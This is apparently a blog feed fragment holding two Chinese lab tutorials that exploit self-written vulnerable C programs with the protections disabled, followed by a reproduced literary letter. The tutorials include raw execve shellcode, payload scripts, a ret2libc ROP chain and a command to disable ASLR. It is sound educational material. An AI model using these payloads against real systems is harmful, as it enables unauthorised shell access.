+<li><p>需要<code>gdb</code> <code>peda</code> <code>python2</code> <code>ROPgadget or Ropper</code></p>
+<a id="more"></a></li>
+<li><p>攻击目标<code>test.c</code>， <code>gcc -g -fno-stack-protector -o test test.c</code></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">10</span>];</span><br><span class="line">	<span class="built_in">read</span>(<span class="number">0</span>,buf,<span class="number">80</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"23333\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="0x01分析"><a href="#0x01分析" class="headerlink" title="0x01分析"></a>0x01分析</h2><p>测试程序很明显存在一个溢出的漏洞，但不能够写入一段<code>shellcode</code>，然后运行，因为此时栈上的数据是不可执行的，也就是打开了NX，可以通过<code>checksec</code>来查看程序的保护情况</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>
+
+<p>幸运的是可以使用<code>ret2libc</code>加上一点<code>ROP</code>，劫持程序执行流，让它运行<code>system()</code></p>
+<h2 id="0x02确定返回地址的偏移量"><a href="#0x02确定返回地址的偏移量" class="headerlink" title="0x02确定返回地址的偏移量"></a>0x02确定返回地址的偏移量</h2>  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ pattern_create 100 test.txt</span><br><span class="line">Writing pattern of 100 chars to filename &quot;test.txt&quot;</span><br><span class="line">gdb-peda$ r &lt; test.txt</span><br><span class="line">...</span><br><span class="line">gdb-peda$ x&#x2F;wx $rsp</span><br><span class="line">0x7fffffffdd08:	0x44414128</span><br><span class="line">gdb-peda$ pattern_offset 0x44414128</span><br><span class="line">1145127208 found at offset: 24</span><br></pre></td></tr></table></figure>
+
+<p>  获得返回地址的偏移量24</p>
+<h2 id="0x03确定相关地址"><a href="#0x03确定相关地址" class="headerlink" title="0x03确定相关地址"></a>0x03确定相关地址</h2>  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ p system</span><br><span class="line">$1 &#x3D; &#123;&lt;text variable, no debug info&gt;&#125; 0x7ffff7a52390 &lt;__libc_system&gt;</span><br><span class="line">gdb-peda$ find &#39;&#x2F;bin&#x2F;sh&#39;</span><br><span class="line">Searching for &#39;&#x2F;bin&#x2F;sh&#39; in: None ranges</span><br><span class="line">Found 1 results, display max 1 items:</span><br><span class="line">libc : 0x7ffff7b99d17 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>因为关掉了<code>ASLR</code>所以动态链接库的地址不会变化，可以直接使用<code>system</code>函数的地址<code>0x7ffff7a52390</code>，字符串<code>/bin/sh</code>的地址<code>0x7ffff7b99d17</code></p>
+<h2 id="0x04构造ROP链"><a href="#0x04构造ROP链" class="headerlink" title="0x04构造ROP链"></a>0x04构造ROP链</h2><p>还有一个需要解决的问题，怎样把<code>/bin/sh</code>传到<code>system</code>函数中去，在<code>linux64</code>的系统上，一般使用寄存器传递参数，按照<code>rdi,rsi,rdx,rcx,r8,r9</code>的顺序传递，如果参数过多，再用栈传递参数</p>
+<p>所以需要一个简短的ROP链<code>pop rdi;ret</code>，可以使用工具<code>Ropper</code> <code>ROPgadget</code>或者直接<code>objdump</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary test|grep pop|grep rdi</span><br><span class="line">0x0000000000400603 : pop rdi ; ret</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05编写payload"><a href="#0x05编写payload" class="headerlink" title="0x05编写payload"></a>0x05编写payload</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> *</span><br><span class="line">buf = <span class="string">'a'</span>*<span class="number">24</span></span><br><span class="line">buf += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x400603</span>)</span><br><span class="line">buf += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x7ffff7b99d17</span>)</span><br><span class="line">buf += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x7ffff7a52390</span>)</span><br><span class="line">f = open(<span class="string">'test.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line">f.write(buf)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+
+<p>整个流程大概是这样的：</p>
+<p>返回地址被<code>pop rdi</code>的地址覆盖，所以程序流被控制了，执行<code>pop rdi;ret</code>，把栈顶弹出到<code>rdi</code>中，栈顶现在是<code>/bin/sh</code>的地址，然后它的地址自然被传递到了<code>rdi</code>寄存器中，接着执行<code>ret</code>，栈顶被弹入到<code>rip</code>，也就是<code>system()</code>的地址被存入了<code>rip</code>，现在调用<code>system()</code>函数，参数存在<code>rdi</code>中</p>
+<h2 id="0x06测试"><a href="#0x06测试" class="headerlink" title="0x06测试"></a>0x06测试</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ (cat test.txt;cat)|.&#x2F;test</span><br><span class="line">23333</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">void0red</span><br></pre></td></tr></table></figure>
+
+<p>可以看到get到了<code>shell</code></p>
+<h2 id="0x07总结"><a href="#0x07总结" class="headerlink" title="0x07总结"></a>0x07总结</h2><p>通过<code>ret2libc</code>可以绕过<code>NX</code></p>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>overflow</title>
+    <url>/2017/11/09/overflow/</url>
+    <content><![CDATA[<blockquote>
+<p>this is a test, not true</p>
+</blockquote>
+<h2 id="0x00准备"><a href="#0x00准备" class="headerlink" title="0x00准备"></a>0x00准备</h2><ul>
+<li><p>本次实验的机器为<code>Ubuntu 16.04.2 LTS</code>64位系统</p>
+</li>
+<li><p>需要关闭ASLR，<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>，如果提示权限不够，可能需要用<code>su</code>提升权限</p>
+</li>
+<li><p>用<code>gcc</code>编译需要关闭<code>stack-protector</code>，允许栈的执行权限<code>execstack</code></p>
+</li>
+<li><p>需要<code>gdb</code> <code>peda</code> <code>python2</code></p>
+</li>
+<li><p>需要一串<code>shellcode</code>，本次使用</p>
+<p><code>\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</code></p>
+<a id="more"></a></li>
+<li><p>一段计算地址的c语言程序<code>getenvaddr</code>，源码在github可以找到，也可以选择下面的编译</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *ptr;</span><br><span class="line">	<span class="keyword">if</span> (argc &lt; <span class="number">3</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Usage: %s &lt;environment var&gt; &lt;target program name&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		ptr = getenv(argv[<span class="number">1</span>]); <span class="comment">/* Get environment variable location */</span></span><br><span class="line">		ptr += (<span class="built_in">strlen</span>(argv[<span class="number">0</span>]) - <span class="built_in">strlen</span>(argv[<span class="number">2</span>])) * <span class="number">2</span>; <span class="comment">/* Adjust for program name */</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%s will be at %p\n"</span>, argv[<span class="number">1</span>], ptr);</span><br><span class="line">	&#125;</span><br><span class="line">  	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+<ul>
+<li><p>攻击目标<code>test.c</code>，自己写的很简单</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">10</span>];</span><br><span class="line">	<span class="built_in">read</span>(<span class="number">0</span>,buf,<span class="number">40</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"23333\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="0x01分析"><a href="#0x01分析" class="headerlink" title="0x01分析"></a>0x01分析</h2><p>通过观察很容易发现程序存在溢出漏洞，字符数组buf只申请了10个字节（10×1）的空间，而read函数却读入了40个字节。使用<code>gcc -g -fno-stack-protector -z execstack -o test test.c</code>编译源文件，用<code>gdb</code>调试程序</p>
+<p>查看main函数处的汇编代码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ disassemble main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0000000000400566 &lt;+0&gt;:	push   rbp				;rbp入栈，保存堆栈帧</span><br><span class="line">   0x0000000000400567 &lt;+1&gt;:	mov    rbp,rsp				;rsp存到rbp中，确定了新的堆栈帧</span><br><span class="line">   0x000000000040056a &lt;+4&gt;:	sub    rsp,0x10				;rsp减16，栈顶变动，为buf开辟了栈空间</span><br><span class="line">   0x000000000040056e &lt;+8&gt;:	lea    rax,[rbp-0x10]			;将栈顶的地址存到rax中</span><br><span class="line">   0x0000000000400572 &lt;+12&gt;:	mov    edx,0x28				;将40存到edx中</span><br><span class="line">   0x0000000000400577 &lt;+17&gt;:	mov    rsi,rax				;传递栈顶地址，rsi存储buf的开始地址</span><br><span class="line">   0x000000000040057a &lt;+20&gt;:	mov    edi,0x0				;将0存到edi中</span><br><span class="line">   0x000000000040057f &lt;+25&gt;:	call   0x400440 &lt;read@plt&gt;		;调用read函数</span><br><span class="line">   0x0000000000400584 &lt;+30&gt;:	mov    edi,0x400624			</span><br><span class="line">   0x0000000000400589 &lt;+35&gt;:	call   0x400430 &lt;puts@plt&gt;</span><br><span class="line">   0x000000000040058e &lt;+40&gt;:	mov    eax,0x0</span><br><span class="line">   0x0000000000400593 &lt;+45&gt;:	leave  </span><br><span class="line">   0x0000000000400594 &lt;+46&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+
+<p>程序执行到调用read函数，<code>call</code>指令会将下条指令的地址入栈，也就是<code>0x400584</code>，作为返回地址，然后将程序控制权交给read函数。</p>
+<p>下面这张图是一般函数栈的构造：</p>
+<p><img src="/images/overflow_0.png" alt=""></p>
+<p>这里栈内大概是这个样子：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rbp					&lt;- 高地址</span><br><span class="line">[]		;空处4字节</span><br><span class="line">buf[9]-buf[8]	;空出2字节</span><br><span class="line">buf[7]-buf[4]</span><br><span class="line">buf[3]-buf[0]</span><br><span class="line">0x400584				&lt;- 低地址</span><br></pre></td></tr></table></figure>
+
+<p>然后read函数读入数据，程序给buf变量实际分配了16字节，为了寻址的方便还有一部分作为保留，一定程度上避免了溢出的发生。</p>
+<p>尝试输入32字节的数据<code>0123456789abcdef0123456789abcdef</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ run</span><br><span class="line">0123456789abcdef0123456789abcdef</span><br><span class="line">23333</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br></pre></td></tr></table></figure>
+
+<p>程序发生了溢出，并且停在了<code>ret</code>指令处，很容易发现<code>rsp</code>，<code>rbp</code>处的值似乎都被输入覆盖了。</p>
+<p>所以read读取完发生了什么？此时栈相当于：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x400584				;返回地址  	 &lt;- 高地址</span><br><span class="line">rbp（main）</span><br><span class="line">...					&lt;-rbp</span><br><span class="line">...</span><br><span class="line">&#123;buf</span><br><span class="line">...</span><br><span class="line">...&#125;					&lt;-rsp		&lt;- 低地址</span><br></pre></td></tr></table></figure>
+
+<p>函数需要返回，有一条<code>leave</code>指令，将<code>rbp</code>拷贝到<code>rsp</code>中，相当于清除了为局部变量分配的空间，此时栈相当于：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x400584				;返回地址  	  &lt;- 高地址</span><br><span class="line">rbp（main）</span><br><span class="line">					&lt;-rbp,rsp	 &lt;- 低地址</span><br></pre></td></tr></table></figure>
+
+<p><code>leave</code>指令还有一个作用是弹栈，即将栈顶的数据弹出到<code>ebp</code>中，也就恢复了main函数的堆栈帧，此时栈相当于：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x400584				;返回地址  	  &lt;- 高地址</span><br><span class="line">					&lt;-rsp		 &lt;- 低地址</span><br></pre></td></tr></table></figure>
+
+<p>接下来，有一条<code>ret</code>指令，弹栈，即将栈顶的数据弹出到<code>rip</code>中，因为<code>rip</code>存储的是当前指令的地址，也就是将返回地址存入了下一个指令的地址，达到了控制权从read函数到main函数的目的。</p>
+<p>这时，思路就很清晰了，只需要合适的数据将返回地址覆盖，程序就会跳转到合适的地方。</p>
+<p><img src="/images/overflow_1.png" alt=""></p>
+<h2 id="0x02确定返回地址的偏移量"><a href="#0x02确定返回地址的偏移量" class="headerlink" title="0x02确定返回地址的偏移量"></a>0x02确定返回地址的偏移量</h2><p>首先，我们需要确定输入到达返回地址所需字节数。</p>
+<p>可以使用<code>peda</code>的<code>pattern_creat</code>创造一个40字节的字符串：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ pattern_create 40 a.txt</span><br><span class="line">Writing pattern of 40 chars to filename &quot;a.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<p>将字符串传入并执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ r &lt; a.txt</span><br><span class="line">Starting program: &#x2F;home&#x2F;void0red&#x2F;Documents&#x2F;pwn&#x2F;test &lt; a.txt</span><br><span class="line">23333</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x400589 &lt;main+35&gt;:	call   0x400430 &lt;puts@plt&gt;</span><br><span class="line">   0x40058e &lt;main+40&gt;:	mov    eax,0x0</span><br><span class="line">   0x400593 &lt;main+45&gt;:	leave  </span><br><span class="line">&#x3D;&gt; 0x400594 &lt;main+46&gt;:	ret    </span><br><span class="line">   0x400595:	nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">   0x40059f:	nop</span><br><span class="line">   0x4005a0 &lt;__libc_csu_init&gt;:	push   r15</span><br><span class="line">   0x4005a2 &lt;__libc_csu_init+2&gt;:	push   r14</span><br></pre></td></tr></table></figure>
+
+<p>程序停在了<code>ret</code>指令的地方，因为覆盖返回地址的是一串无意义的值，无法进行跳转，上一步操作将<code>rbp</code>（寄存器）的值拷贝到<code>rsp</code>（寄存器）中，导致<code>rsp</code>指向了存储返回地址的栈空间，通过查看<code>rsp</code>指向的栈的数据，可以算出返回地址在栈中，相距未读入数据时栈顶的偏移量。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;wx $rsp</span><br><span class="line">0x7fffffffdd08:	0x44414128</span><br></pre></td></tr></table></figure>
+
+<p>可以看出原本存放返回地址的的栈上现在存放的是<code>0x44414128</code></p>
+<p>用<code>pattern_offest</code>计算偏移量</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ pattern_offset 0x44414128</span><br><span class="line">1145127208 found at offset: 24</span><br></pre></td></tr></table></figure>
+
+<p>OK，偏移量为24，也就是说输入值的前24个字节是任意的（注意不要存在<code>\x00</code>之类的字节，可能会导致读入终止），接在后面存入8个字节的地址，就能够实现跳转。</p>
+<h2 id="0x03确定shellcode的地址"><a href="#0x03确定shellcode的地址" class="headerlink" title="0x03确定shellcode的地址"></a>0x03确定shellcode的地址</h2><p>因为选择的<code>shellcode地址</code>为27字节，前面的填充数据要用24字节，合起来超过40字节，无法写入，不如将包含<code>shellcode</code>的指令放入系统环境，用于测试</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export PWN&#x3D;&#96;python -c &#39;print&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;&#39;&#96;</span><br></pre></td></tr></table></figure>
+
+<p>用<code>getenvaddr</code>来确定<code>PWN</code>变量对<code>test</code>输入的地址</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ export PWN&#x3D;&#96;python -c &#39;print&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;&#39;&#96;</span><br><span class="line">$ .&#x2F;getenvaddr PWN .&#x2F;test</span><br><span class="line">PWN will be at 0x7fffffffed03</span><br></pre></td></tr></table></figure>
+
+<p>得到地址<code>0x7fffffffed03</code></p>
+<h2 id="0x04编写Payload"><a href="#0x04编写Payload" class="headerlink" title="0x04编写Payload"></a>0x04编写Payload</h2><p>用python的struct模块写payload的话很方便</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> *</span><br><span class="line">buf = <span class="string">'A'</span> * <span class="number">24</span> + pack(<span class="string">'&lt;Q'</span>,<span class="number">0x7fffffffed03</span>)</span><br><span class="line">f = open(<span class="string">'a.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line">f.write(buf)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+
+<p><code>pack</code>函数用来处理数据很方便：）</p>
+<p><code>pack(format,var0,var1...)</code>按照给定的格式(format)，把后面数据封装成字符串，<code>&lt;</code>是按照小端序，<code>Q</code>是无符号的八字节整数</p>
+<h2 id="0x05测试"><a href="#0x05测试" class="headerlink" title="0x05测试"></a>0x05测试</h2><p>通过管道的方式输入文件的数据</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ (cat a.txt;cat)|.&#x2F;test</span><br><span class="line">23333</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">void0red</span><br></pre></td></tr></table></figure>
+
+<p>经过测试，确实的得到了shell</p>
+<h2 id="0x06总结"><a href="#0x06总结" class="headerlink" title="0x06总结"></a>0x06总结</h2><p>主要是搞清楚函数调用与返回时栈的变化，测试过程中关闭了防护措施</p>
+<ul>
+<li>ASLR</li>
+<li>stack-protector</li>
+<li>execstack</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>a letter</title>
+    <url>/2017/11/05/a_letter/</url>
+    <content><![CDATA[<blockquote>
+<p>安妮宝贝《一封信》</p>
+</blockquote>
+<iframe src="//player.bilibili.com/player.html?aid=3122325&cid=4910113&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>
+<a id="more"></a>
+我想给你写封信。没有什么特别原因，现在也不知道你在哪里，过得可好，以及我们将会在何时何地相逢。告别之后，已经过去很多年。我在信中说些琐碎的言语，就像去探望母亲，早晨醒来彼此絮絮地说话。躺在床上，在刚亮的天色里说各自的心思，说完才起身去梳洗。能够温柔耐心地对话的人太少了。更多时候，更多人，他们关心的都是这个世界的虚假和热闹。
+
+<p>//也许没有逻辑和秩序。也许颠倒了记忆和未来。这些都不重要。只要我在写，你在读。之前我只遇见过一个人，可以说话说到连心的缝隙也没有了。他住在很远的地方。我们说过那么的一次话之后，就告别了。但我知道，这样的告别之后，一定还会再见。</p>
+<p>每个人靠近我们都带着他宿世的要求和责任。如果无缘，就不会在茫茫人海中交际。如果缘尽，就会断然放下再无牵挂。如果心还在背负困难，就说明时间还没有到限。扛着它走，不要对抗，不要推卸，不要控制，不要试图解决。背着它一直往前走。现在如果有任何人问我关于困难的问题，我都会这样说。</p>
+<p>//过去不重要。过去不能累积起我们此刻的心情。幸好有无常，所以一直都会有变化。有时我也会想起一万公里之外，地球的某端，某个小镇。想起清晨微微有些冷的空气，树木的香气，碗里的樱桃，洗衣机的声音，走上楼梯时一盏一盏摁掉的灯。这仿佛是前生与你一起度过的日子。但大多数时候，我什么都记不得了。我把一切忘得干干净净。所以我现在一点都不害怕黑，也不害怕破碎的事物。因为我知道在这些背后，总有一种空无而透明的光芒闪烁着。色即是空，空即是色。说的就是这个。</p>
+<p>我猜想有很多人临终之前，会感觉自己的一生，没有真正地爱和被爱过。人类抵抗孤独，渴求和试图获取爱，最后却以虚荣、以怀疑、以欲望、以婚姻……以各种方式扼杀它。最终他们依然如同没有爱的动物，孤独地死去。我猜想，在人死去时，只有爱是唯一可以被带走的。但是大多数人没有这个。</p>
+<p>如果对方老了，你会悉心照顾，如果你去世，对方会为你安葬。做这些事情其实都不那么难，都未必需要相爱。可以是因为宿缘或者业力，也可以是出于善良和慈悲。爱是太高的奖赏，需要好几世的承诺和执迷不悟。普通人会被自己吓倒。</p>
+<p>世间的孤独有四种。我们和无法真正接纳自己的人有很深的因缘。他们认为自己在爱你，但爱的不是你的灵魂，是你需要修饰的表达和形式。你等待可以接纳自己的人，最后却越来越清楚地看到自己才是支点。一些人于是选择宗教，但宗教如果没有被真正地理解，又会成为他们的止痛片和鸦片。说真话总是会触犯别人，会被误解。最后一种是，始终需要相信。</p>
+<p>当人们真正相爱时，会看到对方婴儿般的灵魂，或者是对方的本来面目。他们就会不再那么需要一切看似庞大而无关的东西，也不关心这个社会或者同类会如何评价他们的生活。人们就可以抛弃掉这些虚假和热闹，而只是安静地互相陪伴，度过余生。只有在我们不相爱的时候，才会把对方看成有侵略性的，危险的，无法掌控的。人们才会需求物质和欢娱，金钱和声名，以这些爱的替代品填补内心的惶恐无助。</p>
+<p>//如果不能成为一个有纯度的容器，人接应不了真理，同样也无法承载极致的感情。佛陀一再在经文里说，对什么样的人才可说法，因为这清凉而滚烫的灌注有可能使你碎裂。同理，有些人因为自己的身心受限，一生都不会知道什么是真正的爱，真正的相信。</p>
+<p>//夏天时我去海边，半夜模糊醒来，看见落地窗外圆月下的大海，潮声汹涌。泛着银光的波浪好像在奔走，但其实哪里都没有去，不过是起起落落。世间大部分事情都如此虚妄，但在一些人心里却是坚定不移的。我想起日本人的审美观，瞬间的美丽可以拿性命去换。他们的偏执可说是一种无明，也可说是一种突破之后的洒脱。</p>
+<p>即便没有过错或罪恶，只是甘愿压抑和拖拉地过一生，也已经是身堕地狱。人还能如何穿透轮回？有勇气真实地活着，才是有力量的。《浮生六记》里面写道：夏月，荷花初开时，晚含而晓放。芸用小纱囊撮茶叶少许，置花心，明早取出，烹天泉水泡之，香韵尤绝。噫。质朴的细节，仿佛梦里逐花，又真实无比。只有被虚掷的不善美的时日，才跟假的一样。</p>
+<p>//如果人类不是为了完成本能的繁衍使命，看不出有何理由需要共处。但在超越性别之后，我们各自才有机会窥见彼此灵魂的暗示。轮回的灵魂最终需要的是融合，消失不见。最易腐朽的肉体却需求着纯属妄想的安全和长久。能够被表达清楚的，通常都不是重要的。那无法陈述的，无法脱卸的，无法展示的，无法传递的，才是重要的。</p>
+<p>//我记得那一天离开威尼斯的早上，听到房间外面传来剧烈的声响，打开旅馆窗户，发现因海风猛烈，船只桨橹在晃动。当时沉浸在这个声音中，仿佛发了愣，心里变得很安静。细节之中，隐藏着无常的美和动荡。人生充满荒诞。荒诞的美，荒诞的艰难。而人们在荒诞的梦中都活得太用力了。</p>
+<p>我只愿在时间中慢慢成为一个简单的人。遇见复杂的事情，知道睡一觉就过完了。事实也是如此。于是突然之间想清楚了一些事情。生命很短暂。在游戏，幻梦，谎言，戏剧，妄想之中，活在当下，这是唯一的意义。然后应该忘记，继续往前走。艰难的时段无一例外都会过去。快乐也是。如同人与人，在告别之后会再次重逢，或者永不再见。</p>
+<p>//如果有选择，你愿成为漂亮的轻快的花好月圆的人类，还是一个在完成任务的战士般的人类？你愿与人做平庸的神仙眷侣，还是一生跨越千山万水但孑然飘零？幸好，我们从没有得到过选择的权利。</p>
+<p>//我们只会相认自己的同类，并最终跟随他们。这种相认也并不局限于人。一座古老的桥，月光下盛开的花，隐隐雨声，四行诗，两盏茶……有些人与事物的呈现，带来和谐及宁静。人与人之间，开端于相认。如果想控制或改变自己所遇见的一切，就会彼此背向而走。</p>
+<p>//如果我们再次遇见，我希望自己爱你的方式，就如同爱着身边正在遇见或即将离开的陌生人。我会以爱其他人的方式去爱你，以爱你的方式去爱其他人。没有所谓的特别的爱，我们所有的人都是一样的。以彼此的痛苦为痛苦，以彼此的快乐为快乐。我正在学习如何去爱。</p>
+<p>//爱更多人，用爱做通道以使彼此能够走得远一些。即使是相爱的伴侣，也应把他当作其中的一员，而不是单独的一个。没有慈悲和承担的感情，走不了远路。在一起，不是为了欢娱，是为了完成。</p>
+<p>//这世间万般幻象都只是心的镜像。憎嫌他人，未必对方有错误，也许只是自己的心被障碍遮蔽。心生喜悦，未必对方多值得赞颂，是这颗心原本就有的情意。如何对待自己，就会如何对待他人。如果对他人有恨意，警惕此刻的心也许抱有投诸对方的期待和恐惧。完整的内心模式，不需迎合或供给。如果能够扩展心量，装下任何一个人，看起来会如同谁都不爱。</p>
+<p>//是的。容器只有清空，才可能试图承载无限。对我来说，重要的事情，不是投入地热爱或忘记。而是无限地热爱或忘记。</p>
+<p>//从本质而言，人，生而孤独。得到伴侣，不是为了填充寂寞或让对方充当令自己快乐的工具。身心合一的标准是，在彼此给予亲密、照顾、关怀、欢爱的世俗内容的同时，生命应因对方的存在而获得更高级别的提升。在关系的修炼中获得实证，这是与自己与他人合一的途径之一。因此，爱对我们来说始终重要。但这种爱，并不仅是指一种亲密或契约的关系。</p>
+<p>//无限制的爱，也许是一种悲心，不是被欲望和业力纠葛的小爱。希望眼前这个人是快乐的，希望对他的生命有所助益，而非伤害与损毁。不管他是谁，出现多久。</p>
+<p>//我远方的朋友说，你要离花近一些。当花开放，它付出生命里此刻全部的能量，是竭尽全力，毫不保留的。这本是接近终结的时刻，但它却这般宁静。全然的相信之后，才会有全然的接纳。而当我们处于修复的过程之中，有时会发现自身存在着一种无需修复的完美。</p>
+<p>//他又说，爱不是把自己当做救世主，要求对方改变。爱是牺牲，把自己化作空气，与对方融为一体。最困难的不是给予，是接纳。接纳即是允许发生，如此便可以熄灭我们的期待和忧虑。很多事情只是我们的方式，并非目标。不能把方式当做目标。</p>
+<p>//所以我们不应有追求空性的执着，但也没有丝毫的消极。可以全心全意做完一件事情，也可以什么都不做。可以用全部身心爱一个人，也可以消失。没有黏滞和妄求的内在，这是一种训练。每个人都需要掌握一些可通过训练得到的基本的技巧，知道如何不伤害自己。只有懂得不伤害自己，才可能做到不去伤害别人，伤害身边的事物。</p>
+<p>//所以，真实的生活即是，认真做好每一天分内的事情。不索取无关的远景。不纠缠于多余情绪和评断。不妄想，不在其中自我沉醉。不伤害，不与自己和他人为敌。不表演，也不相信他人的表演。</p>
+<p>//“你当下周围发生的事情全都是你心性的映照。也就是说，是你的心和念头创造了这个世界。”你相信这段话吗？我相信。这个相信或不信，会决定我们各自的生活方式和价值观点。但这里面没有区分之心。即便见到各种软弱、局限，不管来自他人还是自己，我知道一切均是自然合理。没有美丑，也不存在善恶，只是人类各自的属性所得到的命运。</p>
+<p>//只是，很多人活在自己的世界里，喜欢，骄傲，他们不必相信，也不用听懂其他的话。任何外在的改变都是形式。心，只需要自己发生的改变。</p>
+<p>//人除了自己醒来，无人可帮。只有经历自己对他人的穷追猛打，再经历一次他人对你的穷追猛打，会看到自己曾经有过的错误，和一些做法的不可理喻。再走一段弯路，然后自己醒来或一直不醒。人是多么僵硬和自傲的动物，充满对他人的妄想和断论，却只需要对方配合和服从自己。</p>
+<p>//那些可以轻而易举伤害我们的人，那些一再以痛楚和挫败试探我们的人，那些举起旗子引导我们走入迷途深林的人，那些在削弱我们的力量的人，那些让我们深深触动和粉碎自我的人，他们才是生命中最有力量的老师。如你我这般的俗人，只有真正穿行过黑暗与障碍，才能成为发出微光的人。我从不相信任何借口、理由、托辞、辩论。我只相信我们曾经走过的路。”</p>
